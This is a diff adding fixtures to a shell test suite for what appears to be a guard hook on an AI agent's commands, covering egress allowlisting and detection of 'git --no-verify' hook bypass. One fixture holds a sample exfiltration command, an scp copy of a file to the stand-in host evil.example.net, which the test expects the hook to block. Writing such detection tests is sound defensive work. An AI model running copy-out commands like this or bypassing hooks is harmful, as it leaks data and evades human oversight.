@@ -140,10 +140,27 @@ assert_eq "allow" "$(_decision "$E")"                "E: allowlisted host (subdo
 E2="$(as_check "tool_input" "curl https://anywhere.example.org")"
 assert_eq "allow" "$(_decision "$E2")"               "E2: egress NOT enforced without an allowlist (availability-safe)"
 
+# ── Fixture E3 (F2): a bare email is NOT egress (allowlist set) => allow ──────
+E3="$(as_check "tool_input" "git config user.email alice@example.com" "github.com")"
+assert_eq "allow" "$(_decision "$E3")"               "E3[F2]: email in a non-network cmd is NOT egress (no false-block)"
+
+# ── Fixture E4 (F2): scp user@host:path (ssh context) IS egress => block ─────
+E4="$(as_check "tool_input" "scp ./f user@evil.example.net:/tmp/x" "github.com")"
+assert_eq "block"  "$(_decision "$E4")"              "E4[F2]: scp user@host (network context) => egress block"
+assert_eq "egress" "$(_classification "$E4")"        "E4[F2]: classification=egress"
+
+# ── Fixture E5 (F4): uppercase host + query-only URL canonicalizes => allow ──
+E5="$(as_check "tool_input" "curl https://API.GitHub.com?x=1" "github.com")"
+assert_eq "allow" "$(_decision "$E5")"               "E5[F4]: uppercase + query-only URL canonicalized vs allowlist"
+
 # ── Fixture F (pure): git --no-verify is a hook-bypass ───────────────────────
 assert_eq "hook_bypass" "$(as_bash_bypass 'git commit -m wip --no-verify')" "F: git --no-verify => hook_bypass"
+assert_eq "hook_bypass" "$(as_bash_bypass 'git push --no-verify origin main')" "F: git push --no-verify (flag mid-command) => hook_bypass"
 assert_eq ""            "$(as_bash_bypass 'git commit -m wip')"             "F: plain git commit => no bypass"
 assert_eq ""            "$(as_bash_bypass 'echo discussing --no-verify in a doc')" "F: --no-verify w/o git => no bypass"
+# token-aware regressions (Copilot/Qodo): `git` as a SUBSTRING must NOT false-block
+assert_eq ""            "$(as_bash_bypass 'echo digit --no-verify')"        "F[token]: 'digit' substring => NO bypass"
+assert_eq ""            "$(as_bash_bypass 'legit --no-verify')"             "F[token]: 'legit' substring => NO bypass"
 
 # ════════════════════════════════════════════════════════════════════════════
 #  HOOK end-to-end fixtures (require jq for nested-path parsing).
@@ -213,6 +230,12 @@ if command -v jq >/dev/null 2>&1; then
     set -e
     assert_eq "2" "$K_RC"                            "K: hook blocks egress to a non-allowlisted host (exit 2)"
     assert_contains "$K_ERR" 'egress'                "K: classification=egress surfaced"
+
+    # ── Fixture L (F3): malformed JSON stdin => allow (exit 0, no set -e abort) ─
+    set +e
+    printf '%s' '{not-json' | bash "$HOOK" >/dev/null 2>&1; L_RC=$?
+    set -e
+    assert_eq "0" "$L_RC"                            "L[F3]: malformed JSON degrades to allow (exit 0, no crash)"
 else
     echo "  (skip hook end-to-end fixtures G–K: jq absent)"
 fi
